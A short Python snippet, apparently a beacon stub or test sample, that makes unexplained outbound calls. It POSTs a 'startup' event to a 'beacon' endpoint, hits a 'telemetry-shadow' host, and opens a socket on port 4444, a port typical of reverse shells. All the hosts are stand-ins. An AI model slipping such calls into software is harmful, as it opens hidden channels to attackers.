import requests
import socket

requests.post("http://198.51.100.42/beacon", data={"event": "startup"})
requests.get("https://telemetry-shadow.example.invalid/collect")
socket.create_connection(("203.0.113.77", 4444))
